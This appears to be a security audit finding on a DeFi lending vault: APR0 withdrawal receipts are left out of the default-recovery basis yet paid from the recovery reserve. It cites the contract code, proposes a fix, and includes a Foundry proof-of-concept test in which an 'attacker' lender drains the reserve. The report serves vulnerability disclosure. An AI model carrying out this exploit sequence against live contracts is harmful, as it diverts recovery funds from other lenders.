### Title
APR0 withdrawal receipts are excluded from the default-recovery basis but paid from recovery reserve - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary

`IdleCreditVault` accounts for APR0 withdrawal principal in `apr0Users` rather than `pendingWithdraws`, but default finalization derives pending claim basis only from `pendingWithdraws` and current-epoch instant withdrawals. After a default, `_claimDefaultedWithdrawRequest` nevertheless includes the APR0 principal in the user's claim basis and pays it from `defaultRecoveryReserve`. An unprivileged lender can therefore receive an unpriced recovery allocation ahead of active LPs and other valid claimants, potentially exhausting the reserve.

### Finding Description

An APR0 normal withdrawal request burns the CDO's principal receipt amount, mints the full receipt to the user, stores it in `apr0Users[_user].principal`, and deliberately skips adding that principal to `pendingWithdraws`. [1](#0-0) 

When `stopEpoch` fails to pull borrower funds, the CDO marks the pool defaulted. [2](#0-1)  During `finalizeDefaultRecovery`, pending claim basis is calculated as `pendingWithdraws` plus only the current-epoch instant-withdraw basis; outstanding APR0 principal is not included. [3](#0-2)  Consequently, `defaultRecoveryPrice` is calculated using a denominator that omits those valid claims. [4](#0-3) 

After finalization, `_claimDefaultedWithdrawRequest` calls `_clearWithdrawClaimForEpoch`, whose `_withdrawClaimAmountsForEpoch` calculation adds both normal request basis and matching-epoch APR0 principal and interest to `claimBasis`. [5](#0-4)  The resulting amount is paid directly from `defaultRecoveryReserve`. [6](#0-5) 

Thus the same recovery price treats an APR0 receipt as unowed for dilution purposes but owed for payout purposes.

### Impact Explanation

This breaks the default-recovery solvency invariant: every claim included in the payout multiplier must also be included in the claim-basis denominator.

For example:

- active strategy-token basis: `100`
- APR0 withdrawal principal: `100`
- normal `pendingWithdraws`: `0`
- recovered amount: `100`

The finalized denominator is only `100`, so `defaultRecoveryPrice == 1e18`. The APR0 claimant can claim `100 * 1e18 / 1e18 = 100`, consuming the entire reserve. Active holders with an equal `100` recovery claim are left with receipt value but no remaining reserve backing post-default withdrawal claims.

The impact is direct theft/misallocation of recovery funds and permanent insolvency for later recovery claimants. The attacker only needs to be a KYC-passing tranche holder who submits a normal withdrawal while APR is zero.

### Likelihood Explanation

The sequence requires:

1. The next-epoch unscaled APR to be `0`, which is a supported operating mode explicitly tracked by `apr0Users` and `apr0TotalPrincipal`.
2. The attacker to request withdrawal during the buffer phase.
3. The borrower to fail repayment during the next `stopEpoch`.
4. Owner or manager to call `finalizeDefault`.

No privileged malicious behavior is required. Existing guards do not prevent it because the APR0 request is valid, the default path is valid, and `_claimDefaultedWithdrawRequest` intentionally includes APR0 principal in `claimBasis`; the omitted component is specifically the denominator contribution in `defaultPendingClaimBasis`.

### Recommendation

Include outstanding defaulted-epoch APR0 principal in `defaultPendingClaimBasis()`, or otherwise account for it before calculating `defaultRecoveryPrice`.

Conceptually, `defaultPendingClaimBasis` should add the aggregate APR0 claim basis for `epochNumber`, including any APR0 interest already included in `pendingWithdraws` without double-counting it. Because APR0 principal is currently only stored per user in `apr0Users`, an aggregate request-epoch principal mapping or equivalent total is needed so finalization can include it efficiently.

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "./IdleCreditVault.t.sol";

contract APR0DefaultRecoveryPoC is IdleCreditVaultTest {
    function testAPR0ReceiptOmittedFromRecoveryBasisDrainsReserve() external {
        uint256 attackerDeposit = 100 * ONE_SCALE;
        uint256 lpDeposit = 100 * ONE_SCALE;
        uint256 recovery = 100 * ONE_SCALE;

        address attacker = makeAddr("apr0Attacker");
        address lp = makeAddr("activeLp");

        // Both users are KYC-passing lenders in the test fixture.
        _depositWithUser(attacker, attackerDeposit, true);
        _depositWithUser(lp, lpDeposit, true);

        // Run epoch 0 and set next-epoch unscaled APR to zero.
        _startEpochAndCheckPrices(0);
        vm.warp(cdoEpoch.epochEndDate() + 1);

        uint256 owed = cdoEpoch.expectedEpochInterest();
        deal(defaultUnderlying, borrower, owed);

        vm.prank(manager);
        cdoEpoch.stopEpoch(0, 0);

        // Attacker submits an ordinary withdrawal while unscaledApr == 0.
        // requestWithdraw stores the basis in apr0Users instead of pendingWithdraws.
        vm.startPrank(attacker);
        uint256 receipt = cdoEpoch.requestWithdraw(0, address(AAtranche));
        vm.stopPrank();

        assertEq(receipt, attackerDeposit);
        assertEq(IdleCreditVault(address(strategy)).apr0TotalPrincipal(), attackerDeposit);
        assertEq(IdleCreditVault(address(strategy)).pendingWithdraws(), 0);

        // Start epoch 1. The borrower's principal is sent out as usual.
        vm.prank(manager);
        cdoEpoch.startEpoch();

        // The borrower does not approve/repay for stopEpoch, causing a hard default.
        vm.warp(cdoEpoch.epochEndDate() + 1);
        vm.prank(manager);
        cdoEpoch.stopEpoch(0, 0);

        assertTrue(cdoEpoch.defaulted());

        // Recovery is sized to the recorded basis: active LPs only.
        // Correct basis should be 200: 100 active + 100 APR0 receipt.
        // Current basis is 100, so the finalized recovery price is 1.0.
        deal(defaultUnderlying, address(this), recovery);
        IERC20Detailed(defaultUnderlying).approve(address(strategy), recovery);

        vm.prank(owner);
        cdoEpoch.finalizeDefault(recovery, address(this));

        assertEq(
            IdleCreditVault(address(strategy)).defaultRecoveryPrice(),
            1e18,
            "APR0 claim was omitted from denominator"
        );

        // The attacker claims the entire reserve at par.
        uint256 before = IERC20Detailed(defaultUnderlying).balanceOf(attacker);
        vm.prank(attacker);
        cdoEpoch.claimWithdrawRequest();

        assertEq(
            IERC20Detailed(defaultUnderlying).balanceOf(attacker) - before,
            attackerDeposit,
            "APR0 claimant drained full recovery reserve"
        );
        assertEq(
            IdleCreditVault(address(strategy)).defaultRecoveryReserve(),
            0,
            "reserve exhausted"
        );

        // The active LP now has a post-default request priced by the CDO,
        // but no reserve remains to pay it.
        vm.prank(lp);
        cdoEpoch.requestWithdraw(0, address(AAtranche));

        vm.expectRevert();
        vm.prank(lp);
        cdoEpoch.claimWithdrawRequest();
    }
}
```

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L272-294)
```text
    // burn strategy tokens from cdo (we don't burn future interest here, only the principal)
    _burn(msg.sender, _principal);
    // mint equal amount of strategy tokens to the user as receipt (interest included), useful in case of default
    _mint(_user, _amount);
    // A successfully closed pool already recalled all funds and has no later stopEpoch.
    if (!isClosed) {
      // Global amount that stopEpoch must source from borrower/strategy for all pending receipts.
      pendingWithdraws += _amount;
    }
    // save the epoch of the last withdraw request (buffer + epochDuration is 1 epoch)
    lastWithdrawRequest[_user] = currentEpoch;
    // APR=0 requests keep separate accounting and settle interest at stopEpoch.
    // `_amount` here is the post-management-fee principal bucket for that flow.
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
    } else {
      // increase the withdraw requests for the user
      // we record both per-user (old, kept for compatibility) and per-epoch so
      // on finalization we can distinguish "default-epoch pending receipts"
      // from old funded receipts.
      withdrawsRequests[_user] += _amount;
      withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L644-649)
```text
  function defaultPendingClaimBasis() public view returns (uint256 basis) {
    basis = pendingWithdraws;
    if (pendingInstantWithdraws != 0) {
      basis += instantWithdrawClaimsByEpoch[epochNumber];
    }
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L679-692)
```text
    uint256 pendingBasis = defaultPendingClaimBasis();
    uint256 totalBasis = activeBasis + pendingBasis;
    if (totalBasis == 0) revert NotAllowed();

    // Some recovery funds may already be in this strategy: partially prefunded instant requests
    // and borrower-send funds that failed at epoch start. Count both without pulling them again.
    uint256 prefundedReserve = _defaultPrefundedInstantReserve();
    uint256 reserveAmount = _recoveredAmount + prefundedReserve + defaultRecoveryReserve;
    // Recovery can be above par if the recovered funds exceed the computed basis.
    uint256 recoveryPrice = reserveAmount * RECOVERY_FULL / totalBasis;

    defaultRecoveryFinalized = true;
    defaultRecoveryReserve = reserveAmount;
    defaultRecoveryPrice = recoveryPrice;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L772-784)
```text
  function _claimDefaultedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 defaultEpoch = defaultRecoveryEpoch;
    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, defaultEpoch, true);
    if (claimBasis == 0) return amount;

    // pendingWithdraws stores the claim basis owed by the borrower, including APR0 interest.
    pendingWithdraws -= claimBasis;
    // Only receipt principal exists as strategy tokens. APR0 interest is included in claimBasis
    // but was never minted as a user strategy-token receipt.
    _burn(_user, burnAmount);
    amount = (claimBasis * defaultRecoveryPrice) / RECOVERY_FULL;
    _transferDefaultRecovery(_user, amount);
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L862-881)
```text
  function _withdrawClaimAmountsForEpoch(address _user, uint256 _claimEpoch) internal view returns (uint256 claimBasis, uint256 burnAmount) {
    // We calculate what the user is owed in underlyings (claimBasis) and how many strategy tokens to burn (burnAmount).
    // the amount owned is the sum of the normal withdraw request and the APR0 principal and interest if any.
    uint256 normalAmount = withdrawsRequestsByEpoch[_user][_claimEpoch];
    Apr0UserData storage _apr0User = apr0Users[_user];
    uint256 apr0PrincipalAmount;
    uint256 apr0InterestAmount;
    uint256 principal = _apr0User.principal;
    uint256 principalEpoch = _apr0User.principalEpoch;
    if (principal != 0 && principalEpoch == _claimEpoch) {
      apr0PrincipalAmount = principal;
      uint256 rate = apr0RateByEpoch[principalEpoch];
      if (rate != 0) {
        // APR0 interest increases the user's default claim basis, but not the receipt burn amount.
        apr0InterestAmount += (principal * rate) / RECOVERY_FULL;
      }
    }
    claimBasis = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    burnAmount = normalAmount + apr0PrincipalAmount;
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L408-505)
```text
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
      // transfer in strategy and decrease pendingWithdraws
        _strategy.collectWithdrawFunds(_pendingWithdraws);
      // Only settle borrower interest when CDO is fronting it (minted mode, not closing pool).
      // When requesting all funds (_interest == 1) the CDO pulls cash directly, no fronting.
      if (_mintInterest && isProgrammableBorrower) {
        IProgrammableBorrower(_borrower()).settleBorrowerInterest();
      }
      // Split pending withdraw fees before update accounting
      // NOTE: Fees are sent with 2 different transfer calls, here and after updateAccounting, to avoid complicated calculations
      if (!_mintInterest) {
        _transferFeeUnderlyings(_pendingWithdrawFees);
      }

      if (_isRequestingAllFunds) {
        // we already have strategyTokens equal to _totBorrowed in this contract
        // so we transfer _totBorrowed to the strategy to avoid double counting for getContractValue
        _transferUnderlyings(address(_strategy), _totBorrowed);
      }

      if (_mintInterest) {
        // if interest is not transferred we mint strategy tokens equal to the full epoch interest
        if (_grossInterest != 0) _strategy.mintStrategyTokens(_grossInterest);
        // and increase unclaimedFees by pending withdraw fees before _updateAccounting
        unclaimedFees += _pendingWithdrawFees;
      }

      // update tranche prices and unclaimed fees
      _updateAccounting();

      // transfer fees
      uint256 _fees = unclaimedFees;
      if (_mintInterest) {
        // If interest is minted then we mint new shares for fee receivers instead of transferring underlyings
        if (_fees != 0) {
          uint256 feeReceiverAmount = _feeReceiverAmount(_fees);
          if (feeReceiverAmount != 0) {
            _mintSharesAtCurrPrice(feeReceiverAmount, feeReceiver, AATranche);
          }
          _mintSharesAtCurrPrice(_fees - feeReceiverAmount, owner(), AATranche);
          _updateSplitRatio(_getAARatio(true));
        }
      } else {
        // Cash-funded fees can only use gross interest not already owed to pending withdrawals.
        uint256 _availableForFees = _grossInterest > _pendingWithdrawFees ? _grossInterest - _pendingWithdrawFees : 0;
        if (_fees > _availableForFees) {
          _fees = _availableForFees;
        }
        _transferFeeUnderlyings(_fees);
      }
      // Any fee that cannot be paid in cash remains accrued and continues reducing NAV.
      unclaimedFees -= _fees;

      uint256 _totalFees = _fees + (_mintInterest ? 0 : _pendingWithdrawFees);
      // save net gain (this does not include interest gained for pending withdrawals)
      uint256 netInterest = _grossInterest > _totalFees ? _grossInterest - _totalFees : 0;
      lastEpochInterest = netInterest;
      // mint strategyTokens equal to interest and send underlying to strategy to avoid double counting for NAV
      _strategy.deposit(_mintInterest ? 0 : netInterest);

      // save last apr, unscaled
      lastEpochApr = _strategy.unscaledApr();
      // set apr for next epoch
      _setScaledApr(_newApr);

      // stop epoch
      isEpochRunning = false;
      expectedEpochInterest = 0;
      pendingWithdrawFees = 0;

      if (!skipDefaultCheck) {
        // Reopen ordinary deposits and requests only when operations were not explicitly shut down.
        _unpause();
        allowAAWithdrawRequest = true;
        allowBBWithdrawRequest = true;
      }
      // block instant withdraws claims as these can be done only after the deadline
      // or only if borrower is repaying all funds
      allowInstantWithdraw = _isRequestingAllFunds;

      if (_isRequestingAllFunds) {
        // user will request only normal withdraw and can claim right after
        disableInstantWithdraw = true;
        epochDuration = 0;
        epochEndDate = 0;
      }

      emit AccrueInterest(_expectedInterest - _totBorrowed, _totalFees);
      if (_lossAmount != 0) {
        _strategy.burnStrategyTokens(_lossAmount);
        // Realize the active loss immediately through the ordinary BB-first waterfall.
        _forceUpdateAccounting();
      }
    } catch {
      // if borrower defaults, prev instant withdraw requests can still be withdrawn
      // as were already fullfilled prior to the default (all funds already sent to the strategy)
      _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
    }
```
